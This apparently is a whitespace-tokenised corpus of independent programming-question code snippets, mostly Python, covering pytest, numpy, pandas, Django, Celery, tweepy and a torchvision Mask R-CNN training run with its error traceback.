pytest packagedir/mypackage/ -- var1 foo -- var2 bar pytest -- pyargs mypackage -- var1 foo -- var2 bar usage : pytest [ options ] [ file_or_dir ] [ file_or_dir ] [ ... ] pytest : error : unrecognized arguments : -- var1 foo -- var2 bar pytest -- pyargs mypackage
"for i in range ( 0 , 12 ) : R.append ( scipy.signal.convolve2d ( self.img , h [ i ] , mode = 'same ' ) )"
"mylist = [ [ 5274919 , [ `` my cat '' , `` little dog '' , `` fish '' , `` rat '' ] ] , [ 5274920 , [ `` my cat '' , `` parrot '' , `` little dog '' ] ] , [ 5274991 , [ `` little dog '' , `` fish '' , `` duck '' ] ] ] myconcepts = [ `` my cat '' , `` little dog '' ] hatedconcepts = [ `` rat '' , `` parrot '' ] { `` my cat '' : [ ( `` my cat '' , 2 ) , ( `` little dog '' , 2 ) , ( `` fish '' , 1 ) ] , '' little dog '' : [ ( `` little dog '' , 3 ) , ( `` my cat '' , 2 ) , ( `` fish '' , 2 ) , ( `` duck '' , 1 ) ] } import collectionsmyoutput = [ ] for concept in myconcepts : mykeywords = [ ] for item in mylist : if concept in item [ 1 ] : for mykeyword in item [ 1 ] : if mykeyword in hatedconcepts : pass else : mykeywords.append ( mykeyword ) if len ( mykeywords ) > 0 : sorted_keywords = collections.Counter ( mykeywords ) .most_common ( ) myoutput.append ( tuple ( ( concept , sorted_keywords ) ) ) print ( myoutput ) [ ( 'my cat ' , [ ( 'my cat ' , 2 ) , ( 'little dog ' , 2 ) , ( 'fish ' , 1 ) ] ) , ( 'little dog ' , [ ( 'little dog ' , 3 ) , ( 'my cat ' , 2 ) , ( 'fish ' , 2 ) , ( 'duck ' , 1 ) ] ) ]"
"import matplotlib.pyplot as pltplt.ion ( ) plt.plot ( [ 1.6 , 2.7 ] )"
"mail_addresses = pd.DataFrame ( customers_df.iloc [ : ,0 ] .values ) mail_addresses = mail_addresses.dropna ( axis = 0 , how= 'all ' ) mail_addresses_toArray = mail_addresses.valuesfor i in mail_addresses : dates = [ ] if any ( i.isdigit ( ) ) == True : dates.append ( i ) print ( dates ) AttributeError : 'numpy.int64 ' object has no attribute 'isdigit ' AttributeError : 'numpy.ndarray ' object has no attribute 'isdigit '"
> > > class Foo : ... def __str__ ( self ) : ... return `` instance of class Foo '' ... > > > foo = Foo ( ) > > > print fooinstance of class Foo > > > print Foo__main__.Foo
"add_sal = { 'career_medicine ' : None , 'career_law ' : None , 'median_salary ' : None , 'mean_salary ' : 75000.0 , 'career_business ' : 'operations / logistics ' , 'number ' : None } add_perc = { 'percent ' : 0.07 , 'career_business ' : 'operations / logistics ' } add_all = { 'career_medicine ' : None , 'career_law ' : None , 'median_salary ' : None , 'mean_salary ' : 75000.0 , 'career_business ' : 'operations / logistics ' , 'number ' : None , 'percent ' : 0.07 }"
"SELECT * FROM a , b WHERE ..."
for r in sqlContext.sql ( `` SELECT DISTINCT FIPS FROM MY_DF '' ) .map ( lambda r : r.FIPS ) .collect ( ) : sqlContext.sql ( `` SELECT * FROM MY_DF WHERE FIPS = ' % s ' '' % r ) .rdd.saveAsTextFile ( 'county_ { } '.format ( r ) )
"class MyClass : cache_dict = { } def get_info_server ( self , arg ) : if arg not in self.cache_dict : self.cache_dict [ arg ] = Client.get_from_server ( arg ) return cache_dict [ arg ] def do_something ( self , arg ) : # Do something based on get_info_server ( arg ) # Assume that Client is mocked.def test_caching ( ) : m = MyClass ( ) m.get_info_server ( 'foo ' ) m.get_info_server ( 'foo ' ) mock_client.get_from_server.assert_called_with_once ( 'foo ' ) def test_do_something ( ) : m = MyClass ( ) mock_client.get_from_server.return_value = 'bar ' m.do_something ( 'foo ' ) # This internally calls get_info_server ( 'foo ' )"
"from django.db import transaction @ transaction.non_atomic_requestsdef create ( self , *args , **kwargs ) : m = MyModel ( stuff= '' hello '' ) m.save ( ) raise Exception ( 'exception ! row should still be saved though ' ) return Response ( )"
"class Action : def step1 ( self , arg ) : return False def step2 ( self , arg ) : return Falsedef algorithm ( action ) : action.step1 ( '111 ' ) action.step2 ( '222 ' ) return Trueclass TestAlgorithm ( unittest.TestCase ) : def test_algorithm ( self ) : actionMock = mock.create_autospec ( Action ) self.assertTrue ( algorithm ( actionMock ) ) actionMock.step1.assert_called_once_with ( '111 ' )"
"django.db.utils.ProgrammingError : permission denied to create extension `` postgis '' HINT : Must be superuser to create this extension . DATABASES = { 'default ' : { 'ENGINE ' : 'django.contrib.gis.db.backends.postgis ' , 'NAME ' : 'my_db ' , 'USER ' : 'my_user ' , 'PASSWORD ' : 'my_crazy_secure_password ' , 'HOST ' : '127.0.0.1 ' , 'PORT ' : `` , 'TEST_NAME ' : 'test_my_db ' , } , }"
"@ paralleldef launch ( ) : with cd ( '/working/dir ' ) : run ( `` ./start/script -id= % d '' , host_num )"
from threading import Threadthread = Thread ( target=heavy_computational_worker_thread ) thread.start ( ) from multiprocessing import Processprocess = Process ( target=heavy_computational_worker_thread ) process.start ( ) from queue import Queuequeue = multiprocessing.Queue ( ) import multiprocessingqueue = multiprocessing.Queue ( )
array [ : ] [ 2 ] = 1 func ( array [ : ] [ 2 ] )
"python3 -m venv venv3 # This file must be used with `` source bin/activate '' *from bash* # you can not run it directlydeactivate ( ) { # reset old environment variables if [ -n `` $ _OLD_VIRTUAL_PATH '' ] ; then PATH= '' $ _OLD_VIRTUAL_PATH '' export PATH unset _OLD_VIRTUAL_PATH fi if [ -n `` $ _OLD_VIRTUAL_PYTHONHOME '' ] ; then PYTHONHOME= '' $ _OLD_VIRTUAL_PYTHONHOME '' export PYTHONHOME unset _OLD_VIRTUAL_PYTHONHOME fi # This should detect bash and zsh , which have a hash command that must # be called to get it to forget past commands . Without forgetting # past commands the $ PATH changes we made may not be respected if [ -n `` $ BASH '' -o -n `` $ ZSH_VERSION '' ] ; then hash -r fi if [ -n `` $ _OLD_VIRTUAL_PS1 '' ] ; then PS1= '' $ _OLD_VIRTUAL_PS1 '' export PS1 unset _OLD_VIRTUAL_PS1 fi unset VIRTUAL_ENV if [ ! `` $ 1 '' = `` nondestructive '' ] ; then # Self destruct ! unset -f deactivate fi } # unset irrelevant variablesdeactivate nondestructiveVIRTUAL_ENV= '' /home/pi/django-test/venv3 '' export VIRTUAL_ENV_OLD_VIRTUAL_PATH= '' $ PATH '' PATH= '' $ VIRTUAL_ENV/bin : $ PATH '' export PATH # unset PYTHONHOME if set # this will fail if PYTHONHOME is set to the empty string ( which is bad anyway ) # could use ` if ( set -u ; : $ PYTHONHOME ) ; ` in bashif [ -n `` $ PYTHONHOME '' ] ; then _OLD_VIRTUAL_PYTHONHOME= '' $ PYTHONHOME '' unset PYTHONHOMEfiif [ -z `` $ VIRTUAL_ENV_DISABLE_PROMPT '' ] ; then _OLD_VIRTUAL_PS1= '' $ PS1 '' if [ `` x ( venv3 ) `` ! = x ] ; then PS1= '' ( venv3 ) $ PS1 '' else if [ `` ` basename \ '' $ VIRTUAL_ENV\ '' ` `` = `` __ '' ] ; then # special case for Aspen magic directories # see http : //www.zetadev.com/software/aspen/ PS1= '' [ ` basename \ ` dirname \ '' $ VIRTUAL_ENV\ '' \ `` ] $ PS1 '' else PS1= '' ( ` basename \ '' $ VIRTUAL_ENV\ '' ` ) $ PS1 '' fi fi export PS1fi # This should detect bash and zsh , which have a hash command that must # be called to get it to forget past commands . Without forgetting # past commands the $ PATH changes we made may not be respectedif [ -n `` $ BASH '' -o -n `` $ ZSH_VERSION '' ] ; then hash -rfi [ `` , '/usr/lib/python35.zip ' , '/usr/lib/python3.5 ' , '/usr/lib/python3.5/plat-arm-linux-gnueabihf ' , '/usr/lib/python3.5/lib-dynload ' , '/usr/local/lib/python3.5/dist-packages ' , '/usr/lib/python3/dist-packages ' ] [ `` , '/usr/lib/python35.zip ' , '/usr/lib/python3.5 ' , '/usr/lib/python3.5/plat-arm-linux-gnueabihf ' , '/usr/lib/python3.5/lib-dynload ' , '/home/pi/django-test/venv3/lib/python3.5/site-packages ' ]"
AL 10.5AK 45.6AZ 23.4AR 15.0 ...
"class BaseTask ( Task ) : abstract = True def on_failure ( self , exc , task_id , args , kwargs , einfo ) : logging.info ( 'Task failed ' ) def on_success ( self , retval , task_id , args , kwargs ) : logging.info ( 'Task success ' ) # NO SUCH METHOD IN TASK # def on_start ( self ) : # do_something_on_every_task_start ( ) @ app.task ( base=BaseTask ) def task1 ( x ) : print x @ app.task ( base=BaseTask ) def task2 ( y ) : print y"
"import pandas as pdfrom sklearn.feature_extraction.text import TfidfVectorizer # Will work only for small Datasetcsvfilename = 'data_elements.csv'df = pd.read_csv ( csvfilename ) vectorizer = TfidfVectorizer ( ) corpus = df [ 'text_column ' ] .valuesvectorizer.fit_transform ( corpus ) print ( vectorizer.get_feature_names ( ) ) # Trying to use a generator to parse over a huge dataframedef ChunkIterator ( filename ) : for chunk in pd.read_csv ( csvfilename , chunksize=1 ) : yield chunk [ 'text_column ' ] .valuescorpus = ChunkIterator ( csvfilename ) vectorizer.fit_transform ( corpus ) print ( vectorizer.get_feature_names ( ) ) id , text_column , tags001 , This is the first document . , [ 'sports ' , 'entertainment ' ] 002 , This document is the second document . , '' [ 'politics ' , 'asia ' ] '' 003 , And this is the third one . , [ 'europe ' , 'nato ' ] 004 , Is this the first document ? , '' [ 'sports ' , 'soccer ' ] ''"
"In [ 47 ] : a1 = np.random.randint ( 0,10 , size=1000000 ) In [ 48 ] : a2 = np.random.randint ( 0,10 , size=1000000 ) In [ 52 ] : a1 [ : ,None ] == a2Out [ 52 ] : False In [ 62 ] : a1 = np.random.randint ( 0,10 , size=10000 ) In [ 63 ] : a2 = np.random.randint ( 0,10 , size=10000 ) In [ 64 ] : a1 [ : ,None ] == a2Out [ 64 ] : array ( [ [ False , False , False , ... , False , False , False ] , [ False , False , False , ... , False , False , False ] , [ False , False , False , ... , False , False , False ] , ... , [ False , False , False , ... , False , False , False ] , [ True , False , False , ... , False , False , False ] , [ False , False , False , ... , True , False , False ] ] , dtype=bool ) In [ 65 ] : a1 = np.random.randint ( 0,10 , size=1000000 ) In [ 66 ] : a2 = np.random.randint ( 0,10 , size=1000000 ) In [ 67 ] : a1 == a2Out [ 67 ] : array ( [ False , False , False , ... , False , False , True ] , dtype=bool )"
"from tweepy.streaming import StreamListenerfrom tweepy import OAuthHandlerfrom tweepy import Streamfrom tweepy import TweepErrorfrom tweepy import error # Removed . I have real keys and tokensconsumer_key = `` *** '' consumer_secret = `` *** '' access_token= '' *** '' access_token_secret= '' *** '' class CustomListener ( StreamListener ) : `` '' '' A listener handles tweets are the received from the stream . This is a basic listener that just prints received tweets to stdout . '' '' '' def on_status ( self , status ) : # Do things with the post received . Post is the status object . print status.text return True def on_error ( self , status_code ) : # If error thrown during streaming . # Check here for meaning : # https : //dev.twitter.com/docs/error-codes-responses print `` ERROR : `` , ; print status_code return True def on_timeout ( self ) : # If no post received for too long return True def on_limit ( self , track ) : # If too many posts match our filter criteria and only a subset is # sent to us return True def filter ( self , track_list ) : while True : try : self.stream.filter ( track=track_list ) except error.TweepError as e : raise TweepError ( e ) def go ( self ) : listener = CustomListener ( ) auth = OAuthHandler ( consumer_key , consumer_secret ) self.stream = Stream ( auth , listener , timeout=3600 ) listener.filter ( [ 'LOL ' ] ) if __name__ == '__main__ ' : go ( CustomListener )"
.└── module ├── __init__.py └── submodule ├── __init__.py ├── foo.py └── bar.py import fooimport bar import very_heavy_third_party_module as vhtpm ... from module.submodule.bar import saybarsaybar ( )
class MyModel : ... created_at = models.DateTimeField ( auto_now_add=True ) ... class TestMyModel ( TestCase ) : ... def test_something ( self ) : # mock current time so that ` created_at ` be something like 1800-02-09T020000 my_obj = MyModel.objects.create ( < whatever > ) # and here my_obj.created_at == 1800-02-09T000000 with freeze_now ( `` 1800-02-09 '' ) : MyModel.objects.create ( < whatever > ) # here the created_at does n't fit 1800-02-09
"rc = Redis.from_url ( settings.BROKER_URL ) lock_str = `` bld- % s-lock '' % bld_id lock = rc.lock ( lock_str ) lock = redis_lock.Lock ( rc , lock_str )"
"bottle==0.11.6 from bottle import route , run @ route ( '/ ' ) def hello ( ) : return `` Hello World ! `` run ( host= ' 0.0.0.0 ' , debug=True ) from bottle import route , run , default_appapplication = default_app ( ) @ route ( '/ ' ) def hello ( ) : return `` Hello bottle World ! `` if __name__ == '__main__ ' : application.run ( host= ' 0.0.0.0 ' , debug=True )"
"pytest sanity_test.py : :test_check ERROR : not found : < rootdir > /tests/automation/sanity/sanity_test.py : :test_check ( no name ' < rootdir > /tests/automation/sanity/sanity_test.py : :test_check ' in any of [ < DoctestModule 'tests/automation/sanity/sanity_test.py ' > , < Module 'tests/automation/sanity/sanity_test.py ' > ] ) pytest sanity_test.py def test_check ( ) : pass"
"numSpecies = 10n = IndexedBase ( ' n ' ) i = symbols ( `` i '' , cls=Idx ) nges = summation ( n [ i ] , [ i,1 , numSpecies ] ) diff ( nges , n [ 5 ] ) numSpecies = 10n = symbols ( 'n0 : % d ' % numSpecies ) k = symbols ( ' k ' , integer=True ) ntot = summation ( n [ k ] , [ k,0 , numSpecies ] )"
"import numpy as npimport tensorflow as tftrain_data = np.genfromtxt ( `` TRAINDATA2.txt '' , delimiter= '' `` ) train_input = train_data [ : , :10 ] train_input = train_input.reshape ( 31240 , 10 ) X_train = tf.placeholder ( tf.float32 , [ 31240 , 10 ] ) train_target = train_data [ : , 10 ] train_target = train_target.reshape ( 31240 , 1 ) Y_train = tf.placeholder ( tf.float32 , [ 31240 , 1 ] ) test_data = np.genfromtxt ( `` TESTDATA2.txt '' , delimiter = `` `` ) test_input = test_data [ : , :10 ] test_input = test_input.reshape ( 7800 , 10 ) X_test = tf.placeholder ( tf.float32 , [ 7800 , 10 ] ) test_target = test_data [ : , 10 ] test_target = test_target.reshape ( 7800 , 1 ) Y_test = tf.placeholder ( tf.float32 , [ 7800 , 1 ] ) W = tf.Variable ( tf.zeros ( [ 10 , 1 ] ) ) b = tf.Variable ( tf.zeros ( [ 1 ] ) ) Y_obt = tf.nn.softmax ( tf.matmul ( X_train , W ) + b ) Y_obt_test = tf.nn.softmax ( tf.matmul ( X_test , W ) + b ) cross_entropy = tf.nn.softmax_cross_entropy_with_logits ( logits=Y_obt , labels=Y_train ) train_step = tf.train.GradientDescentOptimizer ( 0.05 ) .minimize ( cross_entropy ) sess = tf.InteractiveSession ( ) tf.global_variables_initializer ( ) .run ( ) for _ in range ( 31240 ) : sess.run ( train_step , feed_dict= { X_train : train_input , Y_train : train_target } ) correct_prediction = tf.equal ( tf.round ( Y_obt_test ) , Y_test ) accuracy = tf.reduce_mean ( tf.cast ( correct_prediction , tf.float32 ) ) print ( sess.run ( accuracy , feed_dict= { X_test : test_input , Y_test : test_target } ) )"
"# df is a dataframe with an DateTimeIndex # brute force for count last n weekdays , wherelnwd = last n weekdaysdef lnwd ( n=1 ) : lnwd , tmp = df.shift ( 7 ) , df.shift ( 7 ) # count last weekday for i in xrange ( n-1 ) : tmp = tmp.shift ( 7 ) lnwd += tmp lnwd = lnwd/n # average return lnwd df.groupby ( lambda x : x.dayofweek ) .mean ( ) # mean of each MTWHFSS"
"points=array ( [ [ 382.49056159 , 640.1731949 ] , [ 496.44669161 , 655.8583119 ] , [ 1255.64762859 , 672.99699399 ] , [ 1070.16520917 , 688.33538171 ] , [ 318.89390168 , 718.05989421 ] , [ 259.7106383 , 822.2 ] , [ 141.52574427 , 28.68594436 ] , [ 1061.13573287 , 28.7094536 ] , [ 820.57417943 , 84.27702407 ] , [ 806.71416007 , 108.50307828 ] ] ) # outputarray ( [ [ 382.49056159 , 640.1731949 ] , [ 496.44669161 , 655.8583119 ] , [ 1255.64762859 , 672.99699399 ] , [ 1070.16520917 , 688.33538171 ] , [ 318.89390168 , 718.05989421 ] , [ 259.7106383 , 822.2 ] , [ 141.52574427 , 28.68594436 ] , [ 1061.13573287 , 28.7094536 ] , [ 813.64416975 , 96.390051175 ] ] )"
"# back_color_width for x in range ( w ) : for y in range ( h ) : if x==0 or y==0 or x==w-1 or y==h-1 : pixels [ x , y ] = back_color"
"cd ~git clone https : //github.com/cocodataset/cocoapi.gitcd cocoapi/PythonAPI python3 setup.py build_ext -- inplacesudo python3 setup.py install cd ~git clone https : //github.com/pytorch/vision.gitcd visiongit checkout v0.5.0 # Sample code from the TorchVision 0.3 Object Detection Finetuning Tutorial # http : //pytorch.org/tutorials/intermediate/torchvision_tutorial.htmlimport osimport numpy as npimport torchfrom PIL import Imageimport torchvisionfrom torchvision.models.detection.faster_rcnn import FastRCNNPredictorfrom torchvision.models.detection.mask_rcnn import MaskRCNNPredictorfrom engine import train_one_epoch , evaluateimport utilsimport transforms as Tclass PennFudanDataset ( object ) : def __init__ ( self , root , transforms ) : self.root = root self.transforms = transforms # load all image files , sorting them to # ensure that they are aligned self.imgs = list ( sorted ( os.listdir ( os.path.join ( root , `` PNGImages '' ) ) ) ) self.masks = list ( sorted ( os.listdir ( os.path.join ( root , `` PedMasks '' ) ) ) ) def __getitem__ ( self , idx ) : # load images ad masks img_path = os.path.join ( self.root , `` PNGImages '' , self.imgs [ idx ] ) mask_path = os.path.join ( self.root , `` PedMasks '' , self.masks [ idx ] ) img = Image.open ( img_path ) .convert ( `` RGB '' ) # note that we have n't converted the mask to RGB , # because each color corresponds to a different instance # with 0 being background mask = Image.open ( mask_path ) mask = np.array ( mask ) # instances are encoded as different colors obj_ids = np.unique ( mask ) # first id is the background , so remove it obj_ids = obj_ids [ 1 : ] # split the color-encoded mask into a set # of binary masks masks = mask == obj_ids [ : , None , None ] # get bounding box coordinates for each mask num_objs = len ( obj_ids ) boxes = [ ] for i in range ( num_objs ) : pos = np.where ( masks [ i ] ) xmin = np.min ( pos [ 1 ] ) xmax = np.max ( pos [ 1 ] ) ymin = np.min ( pos [ 0 ] ) ymax = np.max ( pos [ 0 ] ) boxes.append ( [ xmin , ymin , xmax , ymax ] ) boxes = torch.as_tensor ( boxes , dtype=torch.float32 ) # there is only one class labels = torch.ones ( ( num_objs , ) , dtype=torch.int64 ) masks = torch.as_tensor ( masks , dtype=torch.uint8 ) image_id = torch.tensor ( [ idx ] ) area = ( boxes [ : , 3 ] - boxes [ : , 1 ] ) * ( boxes [ : , 2 ] - boxes [ : , 0 ] ) # suppose all instances are not crowd iscrowd = torch.zeros ( ( num_objs , ) , dtype=torch.int64 ) target = { } target [ `` boxes '' ] = boxes target [ `` labels '' ] = labels target [ `` masks '' ] = masks target [ `` image_id '' ] = image_id target [ `` area '' ] = area target [ `` iscrowd '' ] = iscrowd if self.transforms is not None : img , target = self.transforms ( img , target ) return img , target def __len__ ( self ) : return len ( self.imgs ) def get_model_instance_segmentation ( num_classes ) : # load an instance segmentation model pre-trained pre-trained on COCO model = torchvision.models.detection.maskrcnn_resnet50_fpn ( pretrained=True ) # get number of input features for the classifier in_features = model.roi_heads.box_predictor.cls_score.in_features # replace the pre-trained head with a new one model.roi_heads.box_predictor = FastRCNNPredictor ( in_features , num_classes ) # now get the number of input features for the mask classifier in_features_mask = model.roi_heads.mask_predictor.conv5_mask.in_channels hidden_layer = 256 # and replace the mask predictor with a new one model.roi_heads.mask_predictor = MaskRCNNPredictor ( in_features_mask , hidden_layer , num_classes ) return modeldef get_transform ( train ) : transforms = [ ] transforms.append ( T.ToTensor ( ) ) if train : transforms.append ( T.RandomHorizontalFlip ( 0.5 ) ) return T.Compose ( transforms ) def main ( ) : # train on the GPU or on the CPU , if a GPU is not available device = torch.device ( 'cuda ' ) if torch.cuda.is_available ( ) else torch.device ( 'cpu ' ) # our dataset has two classes only - background and person num_classes = 2 # use our dataset and defined transformations dataset = PennFudanDataset ( 'PennFudanPed ' , get_transform ( train=True ) ) dataset_test = PennFudanDataset ( 'PennFudanPed ' , get_transform ( train=False ) ) # split the dataset in train and test set indices = torch.randperm ( len ( dataset ) ) .tolist ( ) dataset = torch.utils.data.Subset ( dataset , indices [ : -50 ] ) dataset_test = torch.utils.data.Subset ( dataset_test , indices [ -50 : ] ) # define training and validation data loaders # ! ! ! ! CHANGE HERE ! ! ! ! For this function call , I changed the batch_size param value from 2 to 1 , otherwise this file is exactly as provided from the PyTorch website ! ! ! ! data_loader = torch.utils.data.DataLoader ( dataset , batch_size=1 , shuffle=True , num_workers=4 , collate_fn=utils.collate_fn ) data_loader_test = torch.utils.data.DataLoader ( dataset_test , batch_size=1 , shuffle=False , num_workers=4 , collate_fn=utils.collate_fn ) # get the model using our helper function model = get_model_instance_segmentation ( num_classes ) # move model to the right device model.to ( device ) # construct an optimizer params = [ p for p in model.parameters ( ) if p.requires_grad ] optimizer = torch.optim.SGD ( params , lr=0.005 , momentum=0.9 , weight_decay=0.0005 ) # and a learning rate scheduler lr_scheduler = torch.optim.lr_scheduler.StepLR ( optimizer , step_size=3 , gamma=0.1 ) # let 's train it for 10 epochs num_epochs = 10 for epoch in range ( num_epochs ) : # train for one epoch , printing every 10 iterations train_one_epoch ( model , optimizer , data_loader , device , epoch , print_freq=10 ) # update the learning rate lr_scheduler.step ( ) # evaluate on the test dataset evaluate ( model , data_loader_test , device=device ) print ( `` That 's it ! `` ) if __name__ == `` __main__ '' : main ( ) Epoch : [ 0 ] [ 0/120 ] eta : 0:01:41 lr : 0.000047 loss : 7.3028 ( 7.3028 ) loss_classifier : 1.0316 ( 1.0316 ) loss_box_reg : 0.0827 ( 0.0827 ) loss_mask : 6.1742 ( 6.1742 ) loss_objectness : 0.0097 ( 0.0097 ) loss_rpn_box_reg : 0.0046 ( 0.0046 ) time : 0.8468 data : 0.0803 max mem : 1067Epoch : [ 0 ] [ 10/120 ] eta : 0:01:02 lr : 0.000467 loss : 2.0995 ( 3.5058 ) loss_classifier : 0.6684 ( 0.6453 ) loss_box_reg : 0.0999 ( 0.1244 ) loss_mask : 1.2471 ( 2.7069 ) loss_objectness : 0.0187 ( 0.0235 ) loss_rpn_box_reg : 0.0060 ( 0.0057 ) time : 0.5645 data : 0.0089 max mem : 1499Epoch : [ 0 ] [ 20/120 ] eta : 0:00:56 lr : 0.000886 loss : 1.0166 ( 2.1789 ) loss_classifier : 0.2844 ( 0.4347 ) loss_box_reg : 0.1631 ( 0.1540 ) loss_mask : 0.4710 ( 1.5562 ) loss_objectness : 0.0187 ( 0.0242 ) loss_rpn_box_reg : 0.0082 ( 0.0099 ) time : 0.5524 data : 0.0020 max mem : 1704Epoch : [ 0 ] [ 30/120 ] eta : 0:00:50 lr : 0.001306 loss : 0.5554 ( 1.6488 ) loss_classifier : 0.1258 ( 0.3350 ) loss_box_reg : 0.1356 ( 0.1488 ) loss_mask : 0.2355 ( 1.1285 ) loss_objectness : 0.0142 ( 0.0224 ) loss_rpn_box_reg : 0.0127 ( 0.0142 ) time : 0.5653 data : 0.0023 max mem : 1756Epoch : [ 0 ] [ 40/120 ] eta : 0:00:45 lr : 0.001726 loss : 0.4520 ( 1.3614 ) loss_classifier : 0.1055 ( 0.2773 ) loss_box_reg : 0.1101 ( 0.1530 ) loss_mask : 0.1984 ( 0.8981 ) loss_objectness : 0.0063 ( 0.0189 ) loss_rpn_box_reg : 0.0139 ( 0.0140 ) time : 0.5621 data : 0.0023 max mem : 1776Epoch : [ 0 ] [ 50/120 ] eta : 0:00:39 lr : 0.002146 loss : 0.3448 ( 1.1635 ) loss_classifier : 0.0622 ( 0.2346 ) loss_box_reg : 0.1004 ( 0.1438 ) loss_mask : 0.1650 ( 0.7547 ) loss_objectness : 0.0033 ( 0.0172 ) loss_rpn_box_reg : 0.0069 ( 0.0131 ) time : 0.5535 data : 0.0022 max mem : 1776Epoch : [ 0 ] [ 60/120 ] eta : 0:00:33 lr : 0.002565 loss : 0.3292 ( 1.0543 ) loss_classifier : 0.0549 ( 0.2101 ) loss_box_reg : 0.1113 ( 0.1486 ) loss_mask : 0.1596 ( 0.6668 ) loss_objectness : 0.0017 ( 0.0148 ) loss_rpn_box_reg : 0.0082 ( 0.0140 ) time : 0.5590 data : 0.0022 max mem : 1776Epoch : [ 0 ] [ 70/120 ] eta : 0:00:28 lr : 0.002985 loss : 0.4105 ( 0.9581 ) loss_classifier : 0.0534 ( 0.1877 ) loss_box_reg : 0.1049 ( 0.1438 ) loss_mask : 0.1709 ( 0.5995 ) loss_objectness : 0.0015 ( 0.0132 ) loss_rpn_box_reg : 0.0133 ( 0.0138 ) time : 0.5884 data : 0.0023 max mem : 1783Epoch : [ 0 ] [ 80/120 ] eta : 0:00:22 lr : 0.003405 loss : 0.3080 ( 0.8817 ) loss_classifier : 0.0441 ( 0.1706 ) loss_box_reg : 0.0875 ( 0.1343 ) loss_mask : 0.1960 ( 0.5510 ) loss_objectness : 0.0015 ( 0.0122 ) loss_rpn_box_reg : 0.0071 ( 0.0137 ) time : 0.5812 data : 0.0023 max mem : 1783Epoch : [ 0 ] [ 90/120 ] eta : 0:00:17 lr : 0.003825 loss : 0.2817 ( 0.8171 ) loss_classifier : 0.0397 ( 0.1570 ) loss_box_reg : 0.0499 ( 0.1257 ) loss_mask : 0.1777 ( 0.5098 ) loss_objectness : 0.0008 ( 0.0111 ) loss_rpn_box_reg : 0.0068 ( 0.0136 ) time : 0.5644 data : 0.0022 max mem : 1794Epoch : [ 0 ] [ 100/120 ] eta : 0:00:11 lr : 0.004244 loss : 0.2139 ( 0.7569 ) loss_classifier : 0.0310 ( 0.1446 ) loss_box_reg : 0.0327 ( 0.1163 ) loss_mask : 0.1573 ( 0.4731 ) loss_objectness : 0.0003 ( 0.0101 ) loss_rpn_box_reg : 0.0050 ( 0.0128 ) time : 0.5685 data : 0.0022 max mem : 1794Epoch : [ 0 ] [ 110/120 ] eta : 0:00:05 lr : 0.004664 loss : 0.2139 ( 0.7160 ) loss_classifier : 0.0325 ( 0.1358 ) loss_box_reg : 0.0327 ( 0.1105 ) loss_mask : 0.1572 ( 0.4477 ) loss_objectness : 0.0003 ( 0.0093 ) loss_rpn_box_reg : 0.0047 ( 0.0128 ) time : 0.5775 data : 0.0022 max mem : 1794Epoch : [ 0 ] [ 119/120 ] eta : 0:00:00 lr : 0.005000 loss : 0.2486 ( 0.6830 ) loss_classifier : 0.0330 ( 0.1282 ) loss_box_reg : 0.0360 ( 0.1051 ) loss_mask : 0.1686 ( 0.4284 ) loss_objectness : 0.0003 ( 0.0086 ) loss_rpn_box_reg : 0.0074 ( 0.0125 ) time : 0.5655 data : 0.0022 max mem : 1794Epoch : [ 0 ] Total time : 0:01:08 ( 0.5676 s / it ) creating index ... index created ! Traceback ( most recent call last ) : File `` /usr/local/lib/python3.6/dist-packages/numpy/core/function_base.py '' , line 117 , in linspace num = operator.index ( num ) TypeError : 'numpy.float64 ' object can not be interpreted as an integerDuring handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` /home/cdahms/workspace-apps/PennFudanExample/tv-training-code.py '' , line 166 , in < module > main ( ) File `` /home/cdahms/workspace-apps/PennFudanExample/tv-training-code.py '' , line 161 , in main evaluate ( model , data_loader_test , device=device ) File `` /usr/local/lib/python3.6/dist-packages/torch/autograd/grad_mode.py '' , line 49 , in decorate_no_grad return func ( *args , **kwargs ) File `` /home/cdahms/workspace-apps/PennFudanExample/engine.py '' , line 80 , in evaluate coco_evaluator = CocoEvaluator ( coco , iou_types ) File `` /home/cdahms/workspace-apps/PennFudanExample/coco_eval.py '' , line 28 , in __init__ self.coco_eval [ iou_type ] = COCOeval ( coco_gt , iouType=iou_type ) File `` /home/cdahms/models/research/pycocotools/cocoeval.py '' , line 75 , in __init__ self.params = Params ( iouType=iouType ) # parameters File `` /home/cdahms/models/research/pycocotools/cocoeval.py '' , line 527 , in __init__ self.setDetParams ( ) File `` /home/cdahms/models/research/pycocotools/cocoeval.py '' , line 506 , in setDetParams self.iouThrs = np.linspace ( .5 , 0.95 , np.round ( ( 0.95 - .5 ) / .05 ) + 1 , endpoint=True ) File `` < __array_function__ internals > '' , line 6 , in linspace File `` /usr/local/lib/python3.6/dist-packages/numpy/core/function_base.py '' , line 121 , in linspace .format ( type ( num ) ) ) TypeError : object of type < class 'numpy.float64 ' > can not be safely interpreted as an integer.Process finished with exit code 1 evaluate ( model , data_loader_test , device=device )"
"class Response ( object ) : `` '' '' The : class : ` Response < Response > ` object , which contains a server 's response to an HTTP request. `` '' '' def __init__ ( self ) : super ( Response , self ) .__init__ ( ) ... more init method ..."
"# ! /usr/bin/python3.2from bs4 import BeautifulSoup as bscontent = ' < p class= '' title '' > hello world < /p > 's = bs ( content ) print ( s.find_all ( class= '' title '' ) ) File `` bs.py '' , line 7 print ( s.find_all ( class= '' title '' ) ) ^ SyntaxError : invalid syntax soup.find_all ( id= '' link2 '' ) # [ < a class= '' sister '' href= '' http : //example.com/lacie '' id= '' link2 '' > Lacie < /a > ]"
"A = np.array ( [ 0 , 0 , 0 ] ) idx = [ 0 , 0 , 1 , 1 , 2 , 2 ] B = np.array ( [ 1 , 1 , 1 , 1 , 1 , 1 ] ) A [ idx ] += B"
"df = pd.DataFrame ( np.random.random ( ( 5 , 5 ) ) ) print df.to_latex ( ) \begin { tabular } { lrrrrr } \toprule { } & 0 & 1 & 2 & 3 & 4 \\\midrule0 & 0.021896 & 0.716925 & 0.599158 & 0.260573 & 0.665406 \\1 & 0.467573 & 0.235992 & 0.557386 & 0.640438 & 0.528914 \\2 & 0.872155 & 0.053389 & 0.419169 & 0.613036 & 0.606046 \\3 & 0.130878 & 0.732334 & 0.168879 & 0.039845 & 0.289991 \\4 & 0.247346 & 0.370549 & 0.906652 & 0.228841 & 0.766951 \\\bottomrule\end { tabular }"
"def abc ( string ) : import re if re.match ( 'some_pattern ' , string ) : return True else : return Falseabc ( 'some string to match ' )"
